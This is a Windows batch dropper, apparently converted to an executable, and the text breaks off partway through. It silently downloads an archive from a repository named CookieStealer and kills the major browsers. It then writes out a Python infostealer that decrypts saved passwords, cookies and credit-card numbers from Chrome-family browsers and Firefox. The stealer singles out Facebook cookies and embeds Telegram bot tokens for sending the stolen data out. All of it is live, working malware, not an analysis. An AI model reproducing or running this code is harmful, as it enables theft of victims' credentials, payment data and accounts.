::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDpQQQ2MAE+/Fb4I5/jH5umIrHEwXeEtd5zU3KDDD+YV40bhOMR9hykXvdMPCRcWdxGkDg==
::YAwzuBVtJxjWCl3EqQJhSA==
::ZR4luwNxJguZRRnVphFQ
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDpQQQ2MAE+/Fb4I5/jH6++KrS0=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://github.com/h4x0rpeter/CookieStealer/raw/main/python.zip -OutFile C:\\Users\\Public\\Document.zip;
taskkill -f -im chrome.exe
taskkill -f -im msedge.exe
taskkill -f -im chromium.exe
taskkill -f -im brave.exe
taskkill -f -im opera.exe
taskkill -f -im firefox.exe
C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden expand-Archive C:\\Users\\Public\\Document.zip -DestinationPath C:\\Users\\Public\\Document;
echo. >C:\\Users\\Public\\Windows.bat
echo. >C:\\Users\\Public\\stub.py
for /f %%A in ('type "C:\\Users\\Public\\stub.py" ^| find /v /c ""') do (
if %%A lss 3 (
echo test
) else (
exit /b
)
)
echo import os,json,shutil,win32crypt,hmac,platform,sqlite3,base64,random,requests,subprocess>>C:\\Users\\Public\\stub.py
echo from datetime import datetime,timedelta>>C:\\Users\\Public\\stub.py
echo from Crypto.Cipher import DES3>>C:\\Users\\Public\\stub.py
echo from Crypto.Cipher import AES>>C:\\Users\\Public\\stub.py
echo from pyasn1.codec.der import decoder>>C:\\Users\\Public\\stub.py
echo from hashlib import sha1, pbkdf2_hmac>>C:\\Users\\Public\\stub.py
echo from Crypto.Util.Padding import unpad >>C:\\Users\\Public\\stub.py
echo from base64 import b64decode>>C:\\Users\\Public\\stub.py
echo idbot = "backup">>C:\\Users\\Public\\stub.py
echo apibot1='6608881281:AAGayHA-jtozd-jqhQ7bDGo8ZFJge5OiqrE'>>C:\\Users\\Public\\stub.py
echo id1='1948282795'>>C:\\Users\\Public\\stub.py
echo apibot2='6608881281:AAGayHA-jtozd-jqhQ7bDGo8ZFJge5OiqrE'>>C:\\Users\\Public\\stub.py
echo id2='1948282795'>>C:\\Users\\Public\\stub.py
echo hostname = os.getenv("COMPUTERNAME")>>C:\\Users\\Public\\stub.py
echo usernamex = os.getlogin()>>C:\\Users\\Public\\stub.py
echo windows_version = platform.platform()>>C:\\Users\\Public\\stub.py
echo now = datetime.now()>>C:\\Users\\Public\\stub.py
echo response =requests.get("https://ipinfo.io").text>>C:\\Users\\Public\\stub.py
echo ip_country = json.loads(response)>>C:\\Users\\Public\\stub.py
echo name_country = ip_country['region']>>C:\\Users\\Public\\stub.py
echo timezone = ip_country['timezone']>>C:\\Users\\Public\\stub.py
echo city = ip_country['city']>>C:\\Users\\Public\\stub.py
echo ip = ip_country['ip']>>C:\\Users\\Public\\stub.py
echo country_code = ip_country['country']>>C:\\Users\\Public\\stub.py
echo newtime = str(now.hour) + "h" +str(now.minute)+"m"+str(now.second)+"s"+"-"+str(now.day)+"-"+str(now.month)+"-"+str(now.year)>>C:\\Users\\Public\\stub.py
echo name_f = country_code +" "+idbot+" "+ ip +" "+newtime>>C:\\Users\\Public\\stub.py
echo def find_profile(path_userdata):>>C:\\Users\\Public\\stub.py
echo     profile_path = []>>C:\\Users\\Public\\stub.py
echo     for name in os.listdir(path_userdata):>>C:\\Users\\Public\\stub.py
echo         if name.startswith("Profile") or name == 'Default':>>C:\\Users\\Public\\stub.py
echo             dir_path = os.path.join(path_userdata, name)>>C:\\Users\\Public\\stub.py
echo             profile_path.append(dir_path)>>C:\\Users\\Public\\stub.py
echo     return profile_path>>C:\\Users\\Public\\stub.py
echo def get_chrome(data_path,chrome_path):>>C:\\Users\\Public\\stub.py
echo     data_chrome = os.path.join(data_path, "Chrome");os.mkdir(data_chrome)>>C:\\Users\\Public\\stub.py
echo     profiles = find_profile(chrome_path)>>C:\\Users\\Public\\stub.py
echo     for i,profile in enumerate(profiles, 1):>>C:\\Users\\Public\\stub.py
echo         os.mkdir(os.path.join(data_chrome,"profile"+str(i)))>>C:\\Users\\Public\\stub.py
echo         def copy_file():>>C:\\Users\\Public\\stub.py
echo             try:>>C:\\Users\\Public\\stub.py
echo                 if os.path.exists(os.path.join(profile,'Network','Cookies')):>>C:\\Users\\Public\\stub.py
echo                     shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data_chrome,"profile"+str(i),'Cookies')) >>C:\\Users\\Public\\stub.py
echo             except:>>C:\\Users\\Public\\stub.py
echo                 if os.path.exists(os.path.join(profile,'Network','Cookies')):>>C:\\Users\\Public\\stub.py
echo                     shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data_chrome,"profile"+str(i),'Cookies')) >>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(profile,'Login Data')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_chrome,"profile"+str(i),'Login Data'))>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(profile,'Web Data')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(profile,'Web Data'),os.path.join(data_chrome,"profile"+str(i),'Web Data'))>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(chrome_path,'Local State')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(chrome_path,'Local State'),os.path.join(data_chrome,"profile"+str(i),'Local State'))>>C:\\Users\\Public\\stub.py
echo         nem_profile = "profile"+str(i)>>C:\\Users\\Public\\stub.py
echo         copy_file();delete_file(data_path,"Chrome",nem_profile)     >>C:\\Users\\Public\\stub.py
echo def get_edge(data_path,edge_path):>>C:\\Users\\Public\\stub.py
echo     data_edge = os.path.join(data_path, "Edge");os.mkdir(data_edge)>>C:\\Users\\Public\\stub.py
echo     profiles = find_profile(edge_path)>>C:\\Users\\Public\\stub.py
echo     for i,profile in enumerate(profiles, 1):>>C:\\Users\\Public\\stub.py
echo         os.mkdir(os.path.join(data_edge,"profile"+str(i)))>>C:\\Users\\Public\\stub.py
echo         def copy_file():>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(profile,'Network','Cookies')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data_edge,"profile"+str(i),'Cookies'))>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(profile,'Web Data')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(profile,'Web Data'),os.path.join(data_edge,"profile"+str(i),'Web Data'))>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(profile,'Login Data')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_edge,"profile"+str(i),'Login Data'))>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(edge_path,'Local State')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(edge_path,'Local State'),os.path.join(data_edge,"profile"+str(i),'Local State'))>>C:\\Users\\Public\\stub.py
echo         nem_profile = "profile"+str(i)>>C:\\Users\\Public\\stub.py
echo         copy_file();delete_file(data_path,"Edge",nem_profile)  >>C:\\Users\\Public\\stub.py
echo def get_brave(data_path,brave_path):>>C:\\Users\\Public\\stub.py
echo     data_brave = os.path.join(data_path, "Brave");os.mkdir(data_brave)>>C:\\Users\\Public\\stub.py
echo     profiles = find_profile(brave_path)>>C:\\Users\\Public\\stub.py
echo     for i,profile in enumerate(profiles, 1):>>C:\\Users\\Public\\stub.py
echo         os.mkdir(os.path.join(data_brave,"profile"+str(i)))>>C:\\Users\\Public\\stub.py
echo         def copy_file():>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(profile,'Network','Cookies')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(profile,'Network','Cookies'),os.path.join(data_brave,"profile"+str(i),'Cookies'))>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(profile,'Web Data')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(profile,'Web Data'),os.path.join(data_brave,"profile"+str(i),'Web Data'))>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(profile,'Login Data')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_brave,"profile"+str(i),'Login Data'))>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(brave_path,'Local State')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(brave_path,'Local State'),os.path.join(data_brave,"profile"+str(i),'Local State'))>>C:\\Users\\Public\\stub.py
echo         nem_profile = "profile"+str(i)>>C:\\Users\\Public\\stub.py
echo         copy_file();delete_file(data_path,"Brave",nem_profile)>>C:\\Users\\Public\\stub.py
echo def get_opera(data_path,opera_path):>>C:\\Users\\Public\\stub.py
echo     data_opera = os.path.join(data_path, "Opera");os.mkdir(data_opera)>>C:\\Users\\Public\\stub.py
echo     def copy_file():>>C:\\Users\\Public\\stub.py
echo         if os.path.exists(os.path.join(opera_path,'Network','Cookies')):>>C:\\Users\\Public\\stub.py
echo             shutil.copyfile(os.path.join(opera_path,'Network','Cookies'),os.path.join(data_opera,'Cookies'))>>C:\\Users\\Public\\stub.py
echo         if os.path.exists(os.path.join(opera_path,'Web Data')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(opera_path,'Web Data'),os.path.join(data_opera,'Web Data'))>>C:\\Users\\Public\\stub.py
echo         if os.path.exists(os.path.join(opera_path,'Login Data')):>>C:\\Users\\Public\\stub.py
echo             shutil.copyfile(os.path.join(opera_path,'Login Data'),os.path.join(data_opera,'Login Data'))>>C:\\Users\\Public\\stub.py
echo         if os.path.exists(os.path.join(opera_path,'Local State')):>>C:\\Users\\Public\\stub.py
echo             shutil.copyfile(os.path.join(opera_path,'Local State'),os.path.join(data_opera,'Local State'))>>C:\\Users\\Public\\stub.py
echo     copy_file();delete_file(data_path,"Opera","")>>C:\\Users\\Public\\stub.py
echo def get_chromium(data_path,chromium_path):>>C:\\Users\\Public\\stub.py
echo     data_chromium= os.path.join(data_path, "Chromium");os.mkdir(data_chromium)>>C:\\Users\\Public\\stub.py
echo     profiles = find_profile(chromium_path)>>C:\\Users\\Public\\stub.py
echo     for i,profile in enumerate(profiles, 1):>>C:\\Users\\Public\\stub.py
echo         os.mkdir(os.path.join(data_chromium,"profile"+str(i)))>>C:\\Users\\Public\\stub.py
echo         def copy_file():>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(profile,'Cookies')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(profile,'Cookies'),os.path.join(data_chromium,"profile"+str(i),'Cookies'))>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(profile,'Web Data')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(profile,'Web Data'),os.path.join(data_chromium,"profile"+str(i),'Web Data'))>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(profile,'Login Data')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(profile,'Login Data'),os.path.join(data_chromium,"profile"+str(i),'Login Data'))>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(chromium_path,'Local State')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(chromium_path,'Local State'),os.path.join(data_chromium,"profile"+str(i),'Local State'))>>C:\\Users\\Public\\stub.py
echo         nem_profile = "profile"+str(i)>>C:\\Users\\Public\\stub.py
echo         copy_file();delete_file(data_path,"Chromium",nem_profile)>>C:\\Users\\Public\\stub.py
echo def find_profile_firefox(firefox_path):>>C:\\Users\\Public\\stub.py
echo     profile_path = []>>C:\\Users\\Public\\stub.py
echo     for name in os.listdir(firefox_path):>>C:\\Users\\Public\\stub.py
echo             dir_path = os.path.join(firefox_path, name)>>C:\\Users\\Public\\stub.py
echo             profile_path.append(dir_path)>>C:\\Users\\Public\\stub.py
echo     return profile_path>>C:\\Users\\Public\\stub.py
echo def get_firefox(data_path,firefox_path):>>C:\\Users\\Public\\stub.py
echo     data_firefox = os.path.join(data_path,'firefox');os.mkdir(data_firefox)>>C:\\Users\\Public\\stub.py
echo     profiles = find_profile_firefox(firefox_path)>>C:\\Users\\Public\\stub.py
echo     for i,profile in enumerate(profiles, 1):>>C:\\Users\\Public\\stub.py
echo         os.mkdir(os.path.join(data_firefox,"profile"+str(i)))>>C:\\Users\\Public\\stub.py
echo         def copy_file():>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(profile,'cookies.sqlite')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(profile,'cookies.sqlite'),os.path.join(data_firefox,"profile"+str(i),'cookies.sqlite'))>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(profile,'key4.db')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(profile,'key4.db'),os.path.join(data_firefox,"profile"+str(i),'key4.db'))>>C:\\Users\\Public\\stub.py
echo             if os.path.exists(os.path.join(profile,'logins.json')):>>C:\\Users\\Public\\stub.py
echo                 shutil.copyfile(os.path.join(profile,'logins.json'),os.path.join(data_firefox,"profile"+str(i),'logins.json'))>>C:\\Users\\Public\\stub.py
echo         copy_file()>>C:\\Users\\Public\\stub.py
echo         if os.path.exists(os.path.join(data_firefox,"profile"+str(i),'cookies.sqlite')):>>C:\\Users\\Public\\stub.py
echo             delete_firefox(os.path.join(data_firefox,"profile"+str(i)))>>C:\\Users\\Public\\stub.py
echo         else:>>C:\\Users\\Public\\stub.py
echo             shutil.rmtree(os.path.join(data_firefox,"profile"+str(i)))   >>C:\\Users\\Public\\stub.py
echo def encrypt(data_path,name_bz,name_profile):>>C:\\Users\\Public\\stub.py
echo     key_db = os.path.join(data_path ,name_bz,name_profile,"Local State")>>C:\\Users\\Public\\stub.py
echo     login_db = os.path.join(data_path ,name_bz,name_profile,"Login Data")>>C:\\Users\\Public\\stub.py
echo     cookie_db = os.path.join(data_path ,name_bz,name_profile,"Cookies")>>C:\\Users\\Public\\stub.py
echo     credit_db=os.path.join(data_path ,name_bz,name_profile,"Web Data")>>C:\\Users\\Public\\stub.py
echo     with open(key_db, "r", encoding="utf-8") as f:>>C:\\Users\\Public\\stub.py
echo         local_state = f.read()>>C:\\Users\\Public\\stub.py
echo         local_state = json.loads(local_state)>>C:\\Users\\Public\\stub.py
echo     master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])>>C:\\Users\\Public\\stub.py
echo     master_key = master_key[5:]  >>C:\\Users\\Public\\stub.py
echo     master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]>>C:\\Users\\Public\\stub.py
echo     try :>>C:\\Users\\Public\\stub.py
echo         conn = sqlite3.connect(login_db)>>C:\\Users\\Public\\stub.py
echo         cursor = conn.cursor()>>C:\\Users\\Public\\stub.py
echo         cursor.execute("SELECT action_url, username_value, password_value FROM logins")>>C:\\Users\\Public\\stub.py
echo         for r in cursor.fetchall():>>C:\\Users\\Public\\stub.py
echo             url = r[0]>>C:\\Users\\Public\\stub.py
echo             username = r[1]>>C:\\Users\\Public\\stub.py
echo             encrypted_password = r[2]>>C:\\Users\\Public\\stub.py
echo             iv = encrypted_password[3:15]>>C:\\Users\\Public\\stub.py
echo             payload = encrypted_password[15:]>>C:\\Users\\Public\\stub.py
echo             cipher = AES.new(master_key, AES.MODE_GCM, iv)>>C:\\Users\\Public\\stub.py
echo             decrypted_pass = cipher.decrypt(payload)>>C:\\Users\\Public\\stub.py
echo             decrypted_password = decrypted_pass[:-16].decode() >>C:\\Users\\Public\\stub.py
echo             with open((os.path.join(data_path, "password.txt")), 'a',encoding='utf-8') as f:>>C:\\Users\\Public\\stub.py
echo                 f.write("URL: " + url + "\nUSERNAME: " + username + "\nPASS: " + decrypted_password +"\n\nAPPLICATION: "+name_bz+"-"+name_profile+"\n\n"+50*'*'+"\n")      >>C:\\Users\\Public\\stub.py
echo     except :>>C:\\Users\\Public\\stub.py
echo         print("Error ")>>C:\\Users\\Public\\stub.py
echo     try:>>C:\\Users\\Public\\stub.py
echo         db_cre = sqlite3.connect(credit_db)>>C:\\Users\\Public\\stub.py
echo         cursor_credit = db_cre.cursor()>>C:\\Users\\Public\\stub.py
echo         cursor_credit.execute("SELECT * FROM credit_cards")>>C:\\Users\\Public\\stub.py
echo         rows1 = cursor_credit.fetchall()>>C:\\Users\\Public\\stub.py
echo         for row1 in rows1:>>C:\\Users\\Public\\stub.py
echo             encrypted_credit = row1[4]>>C:\\Users\\Public\\stub.py
echo             iv1 = encrypted_credit[3:15]>>C:\\Users\\Public\\stub.py
echo             payload1 = encrypted_credit[15:]>>C:\\Users\\Public\\stub.py
echo             cipher = AES.new(master_key, AES.MODE_GCM, iv1)>>C:\\Users\\Public\\stub.py
echo             decrypted_cre = cipher.decrypt(payload1)>>C:\\Users\\Public\\stub.py
echo             decrypted_credit= decrypted_cre[:-16].decode() >>C:\\Users\\Public\\stub.py
echo             with open((os.path.join(os.environ["TEMP"], name_f, "credit.txt")), 'a',encoding='utf-8') as f:>>C:\\Users\\Public\\stub.py
echo                 f.write("Card number : "+str(decrypted_credit) +"\nExpiration date : "+str(row1[2])+"/"+str(row1[3])+"\nName : "+str(row1[1])+"\nNickname : "+str(row1[10]+"\n\n"))>>C:\\Users\\Public\\stub.py
echo     except:print("")>>C:\\Users\\Public\\stub.py
echo     try:    >>C:\\Users\\Public\\stub.py
echo         conn2 = sqlite3.connect(cookie_db)>>C:\\Users\\Public\\stub.py
echo         conn2.text_factory = lambda b: b.decode(errors="ignore")>>C:\\Users\\Public\\stub.py
echo         cursor2 = conn2.cursor()>>C:\\Users\\Public\\stub.py
echo         cursor2.execute(^""">>C:\\Users\\Public\\stub.py
echo         SELECT host_key, name, value, encrypted_value,is_httponly,is_secure,expires_utc>>C:\\Users\\Public\\stub.py
echo         FROM cookies>>C:\\Users\\Public\\stub.py
echo         ^""")>>C:\\Users\\Public\\stub.py
echo         json_data = []>>C:\\Users\\Public\\stub.py
echo         for host_key, name, value,encrypted_value,is_httponly,is_secure,expires_utc in cursor2.fetchall():>>C:\\Users\\Public\\stub.py
echo             if not value:>>C:\\Users\\Public\\stub.py
echo                 iv = encrypted_value[3:15]>>C:\\Users\\Public\\stub.py
echo                 encrypted_value = encrypted_value[15:]>>C:\\Users\\Public\\stub.py
echo                 cipher = AES.new(master_key, AES.MODE_GCM, iv)>>C:\\Users\\Public\\stub.py
echo                 decrypted_value = cipher.decrypt(encrypted_value)[:-16].decode()>>C:\\Users\\Public\\stub.py
echo             else:>>C:\\Users\\Public\\stub.py
echo                 decrypted_value = value     >>C:\\Users\\Public\\stub.py
echo             json_data.append({>>C:\\Users\\Public\\stub.py
echo                 "host": host_key,>>C:\\Users\\Public\\stub.py
echo                 "name": name,>>C:\\Users\\Public\\stub.py
echo                 "value": decrypted_value,>>C:\\Users\\Public\\stub.py
echo                 "is_httponly":is_httponly,>>C:\\Users\\Public\\stub.py
echo                 "is_secure":is_secure,>>C:\\Users\\Public\\stub.py
echo                 "expires_utc":expires_utc>>C:\\Users\\Public\\stub.py
echo                 })>>C:\\Users\\Public\\stub.py
echo         result = []>>C:\\Users\\Public\\stub.py
echo         for item in json_data:>>C:\\Users\\Public\\stub.py
echo             host = item["host"]>>C:\\Users\\Public\\stub.py
echo             name = item["name"]>>C:\\Users\\Public\\stub.py
echo             value = item["value"]>>C:\\Users\\Public\\stub.py
echo             is_httponly= item["is_httponly"]>>C:\\Users\\Public\\stub.py
echo             is_secure=item["is_secure"]>>C:\\Users\\Public\\stub.py
echo             expires_utc = item["expires_utc"]>>C:\\Users\\Public\\stub.py
echo             if host == ".facebook.com":>>C:\\Users\\Public\\stub.py
echo                 result.append(f"{name} = {value}")>>C:\\Users\\Public\\stub.py
echo             if is_httponly == 1 : httponly = "TRUE">>C:\\Users\\Public\\stub.py
echo             else:httponly = "FAILSE">>C:\\Users\\Public\\stub.py
echo             if is_secure == 1 : secure = "TRUE">>C:\\Users\\Public\\stub.py
echo             else:secure = "FAILSE">>C:\\Users\\Public\\stub.py
echo             cookie = f"{host}\t{httponly}\t{'/'}\t{secure}\t\t{name}\t{value}\n"     >>C:\\Users\\Public\\stub.py
echo             x_nameck=name_bz+"-"+name_profile+ ".txt">>C:\\Users\\Public\\stub.py
echo             with open((os.path.join(data_path,"filecookie",x_nameck)), 'a') as f:>>C:\\Users\\Public\\stub.py
echo                 f.write(cookie)>>C:\\Users\\Public\\stub.py
echo     except:>>C:\\Users\\Public\\stub.py
echo         print(f"Error decrypt data: {str(e)}")>>C:\\Users\\Public\\stub.py
echo def delete_file(data_path,name_bz,name_profile):>>C:\\Users\\Public\\stub.py
echo     try:>>C:\\Users\\Public\\stub.py
echo         encrypt(data_path,name_bz,name_profile)>>C:\\Users\\Public\\stub.py
echo     except:print("")>>C:\\Users\\Public\\stub.py
echo def decryptMoz3DES( globalSalt, entrySalt, encryptedData ):>>C:\\Users\\Public\\stub.py
echo   hp = sha1( globalSalt ).digest()>>C:\\Users\\Public\\stub.py
echo   pes = entrySalt + b'\x00'*(20-len(entrySalt))>>C:\\Users\\Public\\stub.py
echo   chp = sha1( hp+entrySalt ).digest()>>C:\\Users\\Public\\stub.py
echo   k1 = hmac.new(chp, pes+entrySalt, sha1).digest()>>C:\\Users\\Public\\stub.py
echo   tk = hmac.new(chp, pes, sha1).digest()>>C:\\Users\\Public\\stub.py
echo   k2 = hmac.new(chp, tk+entrySalt, sha1).digest()>>C:\\Users\\Public\\stub.py
echo   k = k1+k2>>C:\\Users\\Public\\stub.py
echo   iv = k[-8:]>>C:\\Users\\Public\\stub.py
echo   key = k[:24]>>C:\\Users\\Public\\stub.py
echo   return DES3.new( key, DES3.MODE_CBC, iv).decrypt(encryptedData)>>C:\\Users\\Public\\stub.py
echo def decodeLoginData(data):>>C:\\Users\\Public\\stub.py
echo   asn1data = decoder.decode(b64decode(data)) # decodage base64, puis ASN1>>C:\\Users\\Public\\stub.py
echo   key_id = asn1data[0][0].asOctets()>>C:\\Users\\Public\\stub.py
echo   iv = asn1data[0][1][1].asOctets()>>C:\\Users\\Public\\stub.py
echo   ciphertext = asn1data[0][2].asOctets()>>C:\\Users\\Public\\stub.py
echo   return key_id, iv, ciphertext >>C:\\Users\\Public\\stub.py
echo def getLoginData(afkk):>>C:\\Users\\Public\\stub.py
echo   logins = []>>C:\\Users\\Public\\stub.py
echo   json_file = os.path.join(afkk ,"logins.json")>>C:\\Users\\Public\\stub.py
echo   loginf = open( json_file, 'r',encoding='utf-8').read()>>C:\\Users\\Public\\stub.py
echo   jsonLogins = json.loads(loginf)>>C:\\Users\\Public\\stub.py
echo   for row in jsonLogins['logins']:>>C:\\Users\\Public\\stub.py
echo     encUsername = row['encryptedUsername']>>C:\\Users\\Public\\stub.py
echo     encPassword = row['encryptedPassword']>>C:\\Users\\Public\\stub.py
echo     logins.append( (decodeLoginData(encUsername), decodeLoginData(encPassword), row['hostname']) )>>C:\\Users\\Public\\stub.py
echo   return logins>>C:\\Users\\Public\\stub.py
echo def decryptPBE(decodedItem, globalSalt): >>C:\\Users\\Public\\stub.py
echo   pbeAlgo = str(decodedItem[0][0][0])>>C:\\Users\\Public\\stub.py
echo   if pbeAlgo == '1.2.840.113549.1.12.5.1.3': >>C:\\Users\\Public\\stub.py
echo     entrySalt = decodedItem[0][0][1][0].asOctets()>>C:\\Users\\Public\\stub.py
echo     cipherT = decodedItem[0][1].asOctets()>>C:\\Users\\Public\\stub.py
echo     key = decryptMoz3DES( globalSalt, entrySalt, cipherT )>>C:\\Users\\Public\\stub.py
echo     return key[:24]>>C:\\Users\\Public\\stub.py
echo   elif pbeAlgo == '1.2.840.113549.1.5.13': #pkcs5 pbes2  >>C:\\Users\\Public\\stub.py
echo     entrySalt = decodedItem[0][0][1][0][1][0].asOctets()>>C:\\Users\\Public\\stub.py
echo     iterationCount = int(decodedItem[0][0][1][0][1][1])>>C:\\Users\\Public\\stub.py
echo     keyLength = int(decodedItem[0][0][1][0][1][2])>>C:\\Users\\Public\\stub.py
echo     k = sha1(globalSalt).digest()>>C:\\Users\\Public\\stub.py
echo     key = pbkdf2_hmac('sha256', k, entrySalt, iterationCount, dklen=keyLength)    >>C:\\Users\\Public\\stub.py
echo     iv = b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets()>>C:\\Users\\Public\\stub.py
echo     cipherT = decodedItem[0][1].asOctets()>>C:\\Users\\Public\\stub.py
echo     clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)>>C:\\Users\\Public\\stub.py
echo     return clearText>>C:\\Users\\Public\\stub.py
echo def getKey(afk):  >>C:\\Users\\Public\\stub.py
echo     conn = sqlite3.connect(os.path.join(afk, "key4.db"))>>C:\\Users\\Public\\stub.py
echo     c = conn.cursor()>>C:\\Users\\Public\\stub.py
echo     c.execute("SELECT item1,item2 FROM metadata;")>>C:\\Users\\Public\\stub.py
echo     row = c.fetchone()>>C:\\Users\\Public\\stub.py
echo     globalSalt = row[0] >>C:\\Users\\Public\\stub.py
echo     item2 = row[1]>>C:\\Users\\Public\\stub.py
echo     decodedItem2 = decoder.decode( item2 ) >>C:\\Users\\Public\\stub.py
echo     clearText = decryptPBE( decodedItem2, globalSalt )>>C:\\Users\\Public\\stub.py
echo     if clearText == b'password-check\x02\x02': >>C:\\Users\\Public\\stub.py
echo       c.execute("SELECT a11,a102 FROM nssPrivate;")>>C:\\Users\\Public\\stub.py
echo       for row in c:>>C:\\Users\\Public\\stub.py
echo         if row[0] != None:>>C:\\Users\\Public\\stub.py
echo             break>>C:\\Users\\Public\\stub.py
echo       a11 = row[0]>>C:\\Users\\Public\\stub.py
echo       a102 = row[1] >>C:\\Users\\Public\\stub.py
echo       if a102 != None: >>C:\\Users\\Public\\stub.py
echo         decoded_a11 = decoder.decode( a11 )>>C:\\Users\\Public\\stub.py
echo         clearText= decryptPBE( decoded_a11, globalSalt )>>C:\\Users\\Public\\stub.py
echo         return clearText[:24]   >>C:\\Users\\Public\\stub.py
echo     return None>>C:\\Users\\Public\\stub.py
echo def encrypt_firefox(path_f):>>C:\\Users\\Public\\stub.py
echo     try:>>C:\\Users\\Public\\stub.py
echo         if os.path.exists(os.path.join(path_f ,"logins.json")):>>C:\\Users\\Public\\stub.py
echo             key = getKey(path_f)>>C:\\Users\\Public\\stub.py
echo             logins = getLoginData(path_f)>>C:\\Users\\Public\\stub.py
echo             for i in logins:>>C:\\Users\\Public\\stub.py
echo                 username= unpad( DES3.new( key, DES3.MODE_CBC, i[0][1]).decrypt(i[0][2]),8 ) >>C:\\Users\\Public\\stub.py
echo                 password= unpad( DES3.new( key, DES3.MODE_CBC, i[1][1]).decrypt(i[1][2]),8 ) >>C:\\Users\\Public\\stub.py
echo                 str_pass =  password.decode('utf-8')>>C:\\Users\\Public\\stub.py
echo                 str_user =  username.decode('utf-8')>>C:\\Users\\Public\\stub.py
echo                 with open((os.path.join(path_f,"password.txt")), 'a',encoding='utf-8') as f:>>C:\\Users\\Public\\stub.py
echo                     f.write(i[2]+"          "+str_user + "|"+ str_pass + "\n")>>C:\\Users\\Public\\stub.py
echo     except :>>C:\\Users\\Public\\stub.py
echo         print("")>>C:\\Users\\Public\\stub.py
echo     try:>>C:\\Users\\Public\\stub.py
echo         db_path = os.path.join(path_f, "cookies.sqlite")>>C:\\Users\\Public\\stub.py
echo         db = sqlite3.connect(db_path) >>C:\\Users\\Public\\stub.py
echo         db.text_factory = lambda b: b.decode(errors="ignore")>>C:\\Users\\Public\\stub.py
echo         cursor = db.cursor()>>C:\\Users\\Public\\stub.py
echo         cursor.execute(^""">>C:\\Users\\Public\\stub.py
echo         SELECT id , name, value ,host>>C:\\Users\\Public\\stub.py
echo         FROM moz_cookies>>C:\\Users\\Public\\stub.py
echo         ^""")>>C:\\Users\\Public\\stub.py
echo         json_data = []>>C:\\Users\\Public\\stub.py
echo         for id , name, value ,host in cursor.fetchall():>>C:\\Users\\Public\\stub.py
echo             json_data.append({>>C:\\Users\\Public\\stub.py
echo                 "host": host,>>C:\\Users\\Public\\stub.py
echo                 "name": name,>>C:\\Users\\Public\\stub.py
echo                 "value": value>>C:\\Users\\Public\\stub.py
echo             })>>C:\\Users\\Public\\stub.py
echo         result = []>>C:\\Users\\Public\\stub.py
echo         for item in json_data:>>C:\\Users\\Public\\stub.py
